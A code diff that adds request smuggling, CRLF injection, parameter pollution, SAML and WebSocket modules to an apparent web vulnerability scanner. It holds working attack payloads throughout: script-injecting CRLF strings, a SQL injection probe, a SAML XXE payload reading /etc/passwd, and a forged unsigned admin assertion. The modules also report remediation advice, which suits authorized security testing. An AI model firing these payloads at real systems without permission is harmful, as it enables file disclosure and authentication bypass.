@@ -102,6 +102,12 @@ MODULES_META = [
     {"id": "http_method", "label": "HTTP Method Tampering",  "description": "PUT/DELETE/PATCH on GET-only endpoints, X-HTTP-Method-Override, verb tunneling through POST"},
     {"id": "2fa_bypass",  "label": "2FA/MFA Bypass",         "description": "OTP code reuse, null/empty code acceptance, response manipulation, backup code exposure"},
     {"id": "oauth",       "label": "OAuth Misconfiguration", "description": "Open redirect in callback, missing state parameter, implicit flow, PKCE bypass, token leakage"},
+    # Hunt-skill additions
+    {"id": "smuggling",   "label": "HTTP Request Smuggling", "description": "CL.TE, TE.CL, CL.0 desync detection — high-value target: Akamai/Cloudflare/Nginx reverse proxies"},
+    {"id": "crlf",        "label": "CRLF Injection",         "description": "Response splitting → XSS past CSP script-src 'self', header injection, log poisoning vectors"},
+    {"id": "hpp",         "label": "HTTP Parameter Pollution","description": "Duplicate params for ACL IDOR bypass ($13.5k confirmed), WAF bypass, PHP/ASP.NET/Node.js divergence"},
+    {"id": "saml",        "label": "SAML Attacks",           "description": "Signature wrapping, attribute pollution, void canonicalization bypass — Critical ATO class"},
+    {"id": "websocket",   "label": "WebSocket Security",     "description": "CSWSH (Cross-Site WebSocket Hijacking), missing Origin check, unauthenticated endpoint probe"},
 ]
 
 # ── Models ────────────────────────────────────────────────────────────────────
@@ -3373,6 +3379,502 @@ async def _module_oauth(target: str, client: httpx.AsyncClient) -> AsyncGenerato
         await asyncio.sleep(0)
 
 
+# ── Module: HTTP Request Smuggling ───────────────────────────────────────────
+
+async def _module_smuggling(target: str, client: httpx.AsyncClient) -> AsyncGenerator[dict, None]:
+    """Detect HTTP request smuggling: CL.TE, TE.CL, CL.0 via timing/response divergence."""
+    import socket
+
+    parsed = urlparse(target)
+    host = parsed.hostname or ""
+    port = 443 if parsed.scheme == "https" else 80
+
+    # ── Test 1: TE header obfuscation fingerprint ─────────────────────────────
+    # Servers that ignore TE obfuscation may be vulnerable to TE.CL smuggling
+    obfuscated_te_headers = [
+        {"Transfer-Encoding": "xchunked"},
+        {"Transfer-Encoding": " chunked"},   # leading space
+        {"Transfer-Encoding": "chunked, identity"},
+        {"Transfer-Encoding": "identity\r\nTransfer-Encoding: chunked"},
+    ]
+    for extra_headers in obfuscated_te_headers:
+        try:
+            r = await client.post(target, headers=extra_headers, content=b"0\r\n\r\n", timeout=6)
+            if r.status_code not in (400, 501):
+                yield _finding("smuggling", "te_obfuscation_accepted", "high",
+                    "HTTP Transfer-Encoding Obfuscation Not Rejected",
+                    f"Server accepted a malformed `Transfer-Encoding` header "
+                    f"(`{list(extra_headers.values())[0]}`) without returning 400. "
+                    f"This is a pre-condition for TE.CL or CL.TE request smuggling. "
+                    f"An attacker could desync the front-end/back-end connection to poison "
+                    f"other users' requests, bypass access controls, or steal credentials.",
+                    f"TE header: {list(extra_headers.values())[0]}\nStatus: {r.status_code}",
+                    target, True,
+                    "Reject requests with unrecognised or duplicate Transfer-Encoding values. "
+                    "Ensure the reverse proxy and origin server agree on which header takes precedence.",
+                    confidence="medium")
+                break
+        except httpx.HTTPError:
+            pass
+        await asyncio.sleep(0)
+
+    # ── Test 2: CL.0 — zero Content-Length with body ─────────────────────────
+    # Some servers ignore Content-Length:0 and process body anyway
+    try:
+        r1 = await client.post(target, headers={"Content-Length": "0"},
+                               content=b"GET /smuggled HTTP/1.1\r\nHost: " + host.encode() + b"\r\n\r\n",
+                               timeout=8)
+        r2 = await client.get(target + "/smuggled", timeout=6)
+        if r2.status_code in (200, 301, 302):
+            yield _finding("smuggling", "cl_zero_desync", "high",
+                "Possible CL.0 Request Smuggling — Unexpected Response to Smuggled Path",
+                f"Sent a POST with Content-Length:0 containing a smuggled `GET /smuggled` prefix. "
+                f"The follow-up request to `/smuggled` returned {r2.status_code}, suggesting the "
+                f"backend may have processed the smuggled path. Manual verification required.",
+                f"POST / with CL:0 + smuggled body → follow-up /smuggled: {r2.status_code}",
+                target, True,
+                "Ensure all layers (reverse proxy, CDN, origin) agree on Content-Length handling. "
+                "Disable request body parsing on endpoints that don't require it.",
+                confidence="low")
+    except httpx.HTTPError:
+        pass
+
+    # ── Test 3: Timing oracle for CL.TE ──────────────────────────────────────
+    # If front-end uses CL and backend uses TE, backend waits for final chunk indefinitely
+    try:
+        t0 = time.monotonic()
+        await client.post(
+            target,
+            headers={"Content-Length": "4", "Transfer-Encoding": "chunked"},
+            content=b"1\r\nZ\r\n",   # incomplete chunked body — only 1 chunk, no terminating 0
+            timeout=6,
+        )
+        elapsed = time.monotonic() - t0
+        if elapsed >= 5.5:
+            yield _finding("smuggling", "cl_te_timing", "high",
+                "HTTP Smuggling Timing Oracle — Possible CL.TE Desync",
+                f"A POST with conflicting `Content-Length: 4` and `Transfer-Encoding: chunked` "
+                f"with an incomplete chunked body caused a {elapsed:.1f}s delay. "
+                f"This timing pattern is consistent with CL.TE request smuggling where the back-end "
+                f"waits for the terminal chunk that never arrives.",
+                f"CL:4 + TE:chunked + incomplete body → {elapsed:.1f}s response time",
+                target, True,
+                "Normalize request handling across all proxy layers. Configure the front-end to "
+                "always use Transfer-Encoding when present, or reject ambiguous requests.",
+                confidence="medium")
+    except (httpx.TimeoutException, httpx.HTTPError):
+        pass
+
+
+# ── Module: CRLF Injection ────────────────────────────────────────────────────
+
+async def _module_crlf(target: str, client: httpx.AsyncClient) -> AsyncGenerator[dict, None]:
+    """Detect CRLF injection in URL parameters → header injection, response splitting, XSS past CSP."""
+
+    crlf_payloads = [
+        "%0d%0aX-Injected: crlf-test",
+        "%0aX-Injected: crlf-test",
+        "%0d%0a%20X-Injected: crlf-test",
+        "%r%nX-Injected: crlf-test",
+        "%%0d%%0aX-Injected: crlf-test",
+        "%E5%98%8D%E5%98%8AX-Injected: crlf-test",  # UTF-8 encoded CRLF
+    ]
+    # XSS via response splitting (injects body after headers)
+    xss_payloads = [
+        "%0d%0aContent-Length: 0%0d%0a%0d%0a<script>alert(document.domain)</script>",
+        "%0d%0aContent-Type: text/html%0d%0a%0d%0a<script>alert(1)</script>",
+    ]
+
+    probe_params = ["redirect", "url", "return", "next", "continue", "goto", "path", "q", "search", "lang"]
+
+    for param in probe_params[:5]:
+        for payload in crlf_payloads:
+            url = f"{target}?{param}={payload}"
+            try:
+                r = await client.get(url, follow_redirects=False, timeout=7)
+                if "x-injected" in r.headers or "crlf-test" in str(r.headers).lower():
+                    yield _finding("crlf", "crlf_header_injection", "high",
+                        f"CRLF Injection — Header Injection via `{param}` Parameter",
+                        f"The response contains an injected `X-Injected: crlf-test` header via the "
+                        f"`{param}` parameter. An attacker can inject arbitrary headers, split the "
+                        f"HTTP response, and inject scripts that bypass `Content-Security-Policy: "
+                        f"script-src 'self'` because the injected script lives in the same response.",
+                        f"URL: {url}\nInjected header detected in response",
+                        url, True,
+                        "Validate and encode all user input before using it in HTTP response headers. "
+                        "Reject \\r and \\n characters in redirect targets and header values.",
+                        confidence="high")
+                    break
+            except httpx.HTTPError:
+                pass
+            await asyncio.sleep(0)
+
+    # ── XSS via response splitting ────────────────────────────────────────────
+    for param in probe_params[:3]:
+        for payload in xss_payloads:
+            url = f"{target}?{param}={payload}"
+            try:
+                r = await client.get(url, follow_redirects=False, timeout=7)
+                body = r.text.lower()
+                if "<script>" in body and "alert" in body and r.status_code == 200:
+                    yield _finding("crlf", "crlf_xss_response_split", "high",
+                        f"CRLF Injection → XSS via Response Splitting",
+                        f"The `{param}` parameter reflects a CRLF-terminated payload that injects "
+                        f"a script tag into the response body. This achieves XSS even when "
+                        f"CSP `script-src 'self'` is present, because the script is in the same-origin response.",
+                        f"URL: {url}\nStatus: {r.status_code}\nBody contains injected <script>",
+                        url, True,
+                        "Sanitise all redirect / header values. Strip CRLF characters. "
+                        "Use a strict CSP including `Content-Type: text/html` validation.",
+                        confidence="medium")
+                    break
+            except httpx.HTTPError:
+                pass
+            await asyncio.sleep(0)
+
+    # ── Log poisoning via User-Agent CRLF ─────────────────────────────────────
+    try:
+        crlf_ua = "Mozilla/5.0\r\nX-AttackTrace-CRLF: logged"
+        r = await client.get(target, headers={"User-Agent": crlf_ua}, timeout=6)
+        if r.status_code != 400:
+            yield _finding("crlf", "crlf_log_poison_vector", "medium",
+                "CRLF in User-Agent Not Rejected — Log Poisoning Vector",
+                "The server accepted a request with a CRLF sequence in the User-Agent header "
+                "without returning 400. If access logs are later included via LFI, "
+                "the injected CRLF may corrupt or forge log entries.",
+                f"User-Agent with CRLF → {r.status_code} (expected 400)",
+                target, True,
+                "Validate all incoming header values. Reject or sanitise CRLF in User-Agent. "
+                "Ensure log viewers escape control characters.",
+                confidence="low")
+    except httpx.HTTPError:
+        pass
+
+
+# ── Module: HTTP Parameter Pollution ─────────────────────────────────────────
+
+async def _module_hpp(target: str, client: httpx.AsyncClient, endpoints: set[str]) -> AsyncGenerator[dict, None]:
+    """Test HTTP Parameter Pollution: ACL IDOR bypass, WAF evasion, backend divergence."""
+
+    # ── Test 1: ACL bypass — duplicate ID param ───────────────────────────────
+    # Pattern: auth check reads YOUR_ID (passes), business logic reads VICTIM_ID (wins)
+    test_endpoints = [target + p for p in ["/api/resource", "/api/user", "/api/account",
+                                            "/api/profile", "/api/order"]]
+    # Also include crawled endpoints that look like they take an id param
+    for ep in list(endpoints)[:20]:
+        if any(k in ep for k in ["/user/", "/account/", "/order/", "/profile/", "/resource/"]):
+            test_endpoints.append(ep)
+
+    for url in test_endpoints[:8]:
+        try:
+            # Baseline: single id
+            r_single = await client.get(url, params={"id": "1"}, timeout=6)
+            # Duplicate: id=victim&id=attacker — PHP takes last, Node.js forms array
+            r_dup = await client.get(url + "?id=1&id=2", timeout=6)
+            if (r_dup.status_code in (200, 201) and
+                    r_single.status_code != r_dup.status_code and
+                    r_single.status_code in (401, 403)):
+                yield _finding("hpp", "hpp_acl_bypass", "high",
+                    "HTTP Parameter Pollution — ACL Bypass via Duplicate Parameter",
+                    f"GET {url}?id=1 returns {r_single.status_code} (forbidden), but "
+                    f"GET {url}?id=1&id=2 returns {r_dup.status_code}. "
+                    f"The authorization check reads the first id=1 (yours) and passes, while "
+                    f"the business logic reads the second id=2 (victim's). "
+                    f"This mirrors the $13,500 HackerOne confirmed HPP IDOR pattern.",
+                    f"URL: {url}\nSingle id: {r_single.status_code} → Duplicate id: {r_dup.status_code}",
+                    url, True,
+                    "Reject requests with duplicate parameter names. "
+                    "Ensure all authorization checks read the same parameter that business logic uses.",
+                    confidence="medium")
+                break
+        except httpx.HTTPError:
+            pass
+        await asyncio.sleep(0)
+
+    # ── Test 2: WAF bypass via parameter splitting ────────────────────────────
+    # WAF sees first q=safe, app uses second q=SQLi payload
+    sqli_probe = "1' OR '1'='1"
+    waf_bypass_url = f"{target}/search?q=safe&q={sqli_probe}"
+    try:
+        r_direct = await client.get(f"{target}/search?q={sqli_probe}", timeout=6)
+        r_hpp    = await client.get(waf_bypass_url, timeout=6)
+        if r_direct.status_code in (403, 400, 429) and r_hpp.status_code == 200:
+            yield _finding("hpp", "hpp_waf_bypass", "high",
+                "HTTP Parameter Pollution — WAF Bypass via Duplicate Parameter",
+                "A SQLi payload in `?q=payload` returns "
+                f"{r_direct.status_code} (blocked by WAF), but sending it as the second "
+                f"duplicate parameter (`?q=safe&q=payload`) returns 200. "
+                "The WAF evaluates the first (safe) value; the app processes the second (malicious).",
+                f"Direct: {r_direct.status_code} → HPP: {r_hpp.status_code}\n"
+                f"WAF-bypass URL: {waf_bypass_url}",
+                waf_bypass_url, True,
+                "Configure the WAF to reject requests with duplicate parameters, or set it to "
+                "inspect all values, not just the first. Use parameterised queries to eliminate SQLi.",
+                confidence="medium")
+    except httpx.HTTPError:
+        pass
+
+    # ── Test 3: PHP vs Node.js divergence signal ──────────────────────────────
+    # Server header can confirm which last/first/array behaviour to expect
+    try:
+        r = await client.get(target, timeout=6)
+        server = r.headers.get("server", "").lower()
+        x_powered = r.headers.get("x-powered-by", "").lower()
+        if "php" in x_powered or "apache" in server:
+            yield _finding("hpp", "hpp_php_last_value", "info",
+                "HPP Risk: PHP/Apache — Last Duplicate Parameter Value Wins",
+                "PHP (and Apache mod_php) uses the LAST value when duplicate parameters are sent. "
+                "Combined with an application that uses the FIRST value for auth checks, "
+                "HPP ACL bypass is possible: auth sees YOUR_ID (first), app acts on VICTIM_ID (last).",
+                f"Server: {server or 'unknown'}\nX-Powered-By: {x_powered or 'unknown'}",
+                target, False,
+                "Test `?id=YOUR_ID&id=VICTIM_ID` on all resource endpoints. "
+                "Reject duplicate parameters at the framework level.",
+                confidence="high")
+        elif "node" in x_powered or "express" in x_powered:
+            yield _finding("hpp", "hpp_node_array", "info",
+                "HPP Risk: Node.js/Express — Duplicate Parameters Form an Array",
+                "Express.js (via `qs` library) converts duplicate parameters into an array. "
+                "If authorization checks `req.query.id === userID` (string comparison) but "
+                "the array `[userID, victimID]` coerces truthy, HPP bypass may be possible.",
+                f"X-Powered-By: {x_powered}",
+                target, False,
+                "Validate that authorization checks perform strict type comparison "
+                "and cannot be confused by array inputs from duplicate parameters.",
+                confidence="medium")
+    except httpx.HTTPError:
+        pass
+
+
+# ── Module: SAML Attacks ──────────────────────────────────────────────────────
+
+async def _module_saml(target: str, client: httpx.AsyncClient) -> AsyncGenerator[dict, None]:
+    """Probe SAML endpoints: signature wrapping, attribute pollution, XXE in SAMLResponse."""
+
+    saml_paths = [
+        "/saml/acs", "/saml/consume", "/sso/saml", "/auth/saml/callback",
+        "/api/saml/acs", "/saml2/acs", "/sso/saml2", "/login/saml",
+        "/Saml2/Acs", "/auth/sso", "/sso",
+    ]
+
+    saml_endpoint = None
+    for path in saml_paths:
+        try:
+            r = await client.get(target + path, timeout=6, follow_redirects=False)
+            if r.status_code in (200, 302, 405, 400):
+                saml_endpoint = target + path
+                break
+        except httpx.HTTPError:
+            pass
+        await asyncio.sleep(0)
+
+    if saml_endpoint is None:
+        # Check for IdP redirect or SSO link on main page
+        try:
+            r = await client.get(target, timeout=8)
+            body = r.text.lower()
+            if "saml" in body or "sso" in body or "shibboleth" in body:
+                yield _finding("saml", "saml_endpoint_detected", "info",
+                    "SAML / SSO References Detected in Page",
+                    "The target page references SAML or SSO keywords. "
+                    "SAML endpoints should be tested for signature wrapping and attribute pollution. "
+                    "Use Burp Suite's SAML Raider extension for thorough testing.",
+                    f"Keywords found: {[k for k in ['saml', 'sso', 'shibboleth'] if k in body]}\n"
+                    f"No ACS endpoint responding — manual probe recommended.",
+                    target, False,
+                    "Test SAML responses with SAML Raider (Burp extension) for signature wrapping "
+                    "and attribute pollution before going live.",
+                    confidence="low")
+            return
+        except httpx.HTTPError:
+            return
+
+    yield _finding("saml", "saml_endpoint_found", "info",
+        "SAML ACS Endpoint Detected",
+        f"A SAML Assertion Consumer Service (ACS) endpoint was found at `{saml_endpoint}`. "
+        "SAML endpoints are a Critical-severity attack surface. "
+        "Known attacks: XML Signature Wrapping (attacker-controlled assertion alongside signed one), "
+        "attribute pollution (duplicate role attributes where Ruby takes LAST = admin), "
+        "and void canonicalization (PortSwigger 2025 nomination).",
+        f"Endpoint: {saml_endpoint}",
+        saml_endpoint, False,
+        "Test with Burp Suite SAML Raider. Ensure XML signature validation uses "
+        "strict canonicalization. Reject SAMLResponse with unsigned assertions. "
+        "Use the ID attribute of the signed Assertion, not position.",
+        confidence="high")
+
+    # ── Test 1: XXE in SAMLResponse ───────────────────────────────────────────
+    import base64 as _b64
+    xxe_saml = """<?xml version="1.0"?>
+<!DOCTYPE samlp:Response [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">
+  <saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">
+    <saml:AttributeStatement>
+      <saml:Attribute Name="email">
+        <saml:AttributeValue>&xxe;</saml:AttributeValue>
+      </saml:Attribute>
+    </saml:AttributeStatement>
+  </saml:Assertion>
+</samlp:Response>"""
+    encoded = _b64.b64encode(xxe_saml.encode()).decode()
+    try:
+        r = await client.post(saml_endpoint,
+                              data={"SAMLResponse": encoded, "RelayState": ""},
+                              timeout=8)
+        body = r.text
+        if "root:" in body or "/bin/" in body or "nobody:" in body:
+            yield _finding("saml", "saml_xxe_rce", "critical",
+                "XXE in SAML SAMLResponse — File Disclosure Confirmed",
+                f"Sending a SAMLResponse with an XXE payload (`<!ENTITY xxe SYSTEM \"file:///etc/passwd\">`) "
+                f"to {saml_endpoint} returned the server's /etc/passwd in the response body. "
+                "This demonstrates blind XXE or direct file disclosure via SAML XML parsing.",
+                f"Response body: {body[:300]}",
+                saml_endpoint, True,
+                "Disable XML external entity processing in the SAML library. "
+                "Use `libxml_disable_entity_loader(true)` (PHP) or equivalent. "
+                "Validate and reject DTD declarations in SAMLResponse.",
+                confidence="high")
+        elif r.status_code not in (400, 415) and "error" not in body.lower()[:100]:
+            yield _finding("saml", "saml_xxe_no_rejection", "medium",
+                "SAML ACS Accepts DTD Declarations — Possible XXE",
+                f"POST to {saml_endpoint} with a SAMLResponse containing a DOCTYPE/XXE declaration "
+                f"returned {r.status_code} (not rejected with 400). "
+                "The XML parser may process external entities — manual verification needed.",
+                f"SAMLResponse with XXE payload → {r.status_code}",
+                saml_endpoint, True,
+                "Disable XML external entities. Test with an OOB XXE payload using Burp Collaborator.",
+                confidence="low")
+    except httpx.HTTPError:
+        pass
+
+    # ── Test 2: Signature wrapping hint ──────────────────────────────────────
+    # We can't forge signatures, but can detect if unsigned assertions are rejected
+    unsigned_saml = _b64.b64encode(b"""<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
+  xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="INJECTED">
+  <saml:Assertion ID="INJECTED">
+    <saml:Subject>
+      <saml:NameID>attacker@evil.com</saml:NameID>
+    </saml:Subject>
+    <saml:AttributeStatement>
+      <saml:Attribute Name="role"><saml:AttributeValue>admin</saml:AttributeValue></saml:Attribute>
+    </saml:AttributeStatement>
+  </saml:Assertion>
+</samlp:Response>""").decode()
+    try:
+        r = await client.post(saml_endpoint,
+                              data={"SAMLResponse": unsigned_saml, "RelayState": ""},
+                              timeout=8)
+        if r.status_code in (200, 302) and r.status_code != 400:
+            yield _finding("saml", "saml_unsigned_assertion_not_rejected", "critical",
+                "SAML ACS Does Not Reject Unsigned Assertions",
+                f"POST to {saml_endpoint} with a completely unsigned SAMLResponse "
+                f"returned {r.status_code}. A properly configured SAML SP must return 400 "
+                f"or redirect to an error page for unsigned assertions. "
+                "If not validated, an attacker can craft arbitrary assertions to authenticate as any user.",
+                f"Unsigned SAMLResponse → {r.status_code} (expected 400 / error redirect)",
+                saml_endpoint, True,
+                "Configure the SAML SP library to require signed Assertions. "
+                "Reject responses where the Assertion lacks a valid ds:Signature. "
+                "Use SAML Raider to test signature stripping and wrapping.",
+                confidence="medium")
+    except httpx.HTTPError:
+        pass
+
+
+# ── Module: WebSocket Security ────────────────────────────────────────────────
+
+async def _module_websocket(target: str, client: httpx.AsyncClient) -> AsyncGenerator[dict, None]:
+    """Detect Cross-Site WebSocket Hijacking (CSWSH) and unauthenticated WS endpoints."""
+
+    # ── Step 1: Find WebSocket endpoints from page source ────────────────────
+    ws_urls: list[str] = []
+    try:
+        r = await client.get(target, timeout=8)
+        body = r.text
+        # Extract ws:// or wss:// URLs from page/JS
+        for match in re.finditer(r'(?:wss?://|["\'])((?:/[^\'"]+)?(?:ws|socket|chat|realtime|events|hub|feed)[^\s\'"<>]*)',
+                                  body, re.IGNORECASE):
+            raw = match.group(1)
+            if raw.startswith("ws"):
+                ws_urls.append(raw)
+            elif raw.startswith("/"):
+                scheme = "wss" if target.startswith("https") else "ws"
+                host = urlparse(target).netloc
+                ws_urls.append(f"{scheme}://{host}{raw}")
+    except httpx.HTTPError:
+        pass
+
+    # Common WebSocket paths to probe
+    common_ws_paths = ["/ws", "/websocket", "/socket.io/", "/cable", "/hub",
+                       "/api/ws", "/api/socket", "/chat", "/realtime", "/events/stream"]
+    parsed = urlparse(target)
+    ws_scheme = "wss" if parsed.scheme == "https" else "ws"
+    for path in common_ws_paths:
+        ws_urls.append(f"{ws_scheme}://{parsed.netloc}{path}")
+
+    # Deduplicate
+    ws_urls = list(dict.fromkeys(ws_urls))[:10]
+
+    if not ws_urls:
+        return
+
+    # ── Step 2: HTTP upgrade probe (use HTTP client to check 101/400) ────────
+    for ws_url in ws_urls:
+        http_url = ws_url.replace("wss://", "https://").replace("ws://", "http://")
+        try:
+            r = await client.get(http_url,
+                headers={"Upgrade": "websocket", "Connection": "Upgrade",
+                         "Sec-WebSocket-Key": "dGhlIHNhbXBsZSBub25jZQ==",
+                         "Sec-WebSocket-Version": "13"},
+                timeout=6, follow_redirects=False)
+            if r.status_code in (101, 200, 400):
+                # Check CSWSH: re-probe with a cross-origin Origin header
+                r_cross = await client.get(http_url,
+                    headers={"Upgrade": "websocket", "Connection": "Upgrade",
+                             "Origin": "https://evil-attacker.com",
+                             "Sec-WebSocket-Key": "dGhlIHNhbXBsZSBub25jZQ==",
+                             "Sec-WebSocket-Version": "13"},
+                    timeout=6, follow_redirects=False)
+                if r_cross.status_code in (101, 200):
+                    yield _finding("websocket", "cswsh_no_origin_check", "high",
+                        "Cross-Site WebSocket Hijacking (CSWSH) — Origin Not Validated",
+                        f"The WebSocket endpoint `{ws_url}` accepted an upgrade request with "
+                        f"`Origin: https://evil-attacker.com` (returned {r_cross.status_code}). "
+                        f"Unlike XMLHttpRequest, WebSocket connections are not subject to CORS — "
+                        f"the browser will send cookies automatically. An attacker-controlled page "
+                        f"can open this WebSocket and exfiltrate all messages from a logged-in victim.",
+                        f"WS endpoint: {ws_url}\nCross-origin upgrade → {r_cross.status_code}",
+                        http_url, True,
+                        "Validate the `Origin` header on every WebSocket upgrade request. "
+                        "Reject connections from unexpected origins. "
+                        "Implement a CSRF token in the WebSocket handshake URL or as a first message.",
+                        confidence="medium")
+                elif r.status_code == 101 and r_cross.status_code in (403, 400):
+                    yield _finding("websocket", "ws_origin_check_present", "info",
+                        f"WebSocket Endpoint Found — Origin Check Present",
+                        f"WebSocket at `{ws_url}` appears to validate the Origin header. "
+                        "Same-origin upgrade accepted; cross-origin upgrade rejected.",
+                        f"Same-origin: {r.status_code} → Cross-origin: {r_cross.status_code}",
+                        http_url, False,
+                        "Continue validating Origin on every WS connection. "
+                        "Also ensure authentication tokens are required in the handshake.",
+                        confidence="medium")
+                else:
+                    yield _finding("websocket", "ws_endpoint_found", "info",
+                        f"WebSocket Endpoint Detected — Manual CSWSH Testing Required",
+                        f"A WebSocket endpoint was detected at `{ws_url}` (HTTP {r.status_code}). "
+                        "Full CSWSH testing requires a real browser. Use Burp Suite to intercept "
+                        "the WS handshake and replay it with a cross-origin Origin header.",
+                        f"Endpoint: {ws_url}\nUpgrade probe: {r.status_code}",
+                        http_url, False,
+                        "Test manually: intercept WS handshake in Burp, change Origin to evil.com. "
+                        "If the server sends user data, CSWSH is confirmed.",
+                        confidence="low")
+        except httpx.HTTPError:
+            pass
+        await asyncio.sleep(0)
+
+
 # ── Main Stream ───────────────────────────────────────────────────────────────
 
 async def _stream_attack_suite(scan_id: str, req: AttackSuiteRequest) -> AsyncGenerator[str, None]:
@@ -3601,6 +4103,12 @@ async def _stream_attack_suite(scan_id: str, req: AttackSuiteRequest) -> AsyncGe
             "http_method": lambda: _module_http_method(req.target, client, crawl_result.endpoints, spa_fallback_size),
             "2fa_bypass":  lambda: _module_2fa_bypass(req.target, client),
             "oauth":       lambda: _module_oauth(req.target, client),
+            # Hunt-skill modules
+            "smuggling":   lambda: _module_smuggling(req.target, client),
+            "crlf":        lambda: _module_crlf(req.target, client),
+            "hpp":         lambda: _module_hpp(req.target, client, crawl_result.endpoints),
+            "saml":        lambda: _module_saml(req.target, client),
+            "websocket":   lambda: _module_websocket(req.target, client),
         }
 
         for mod_id in req.modules:
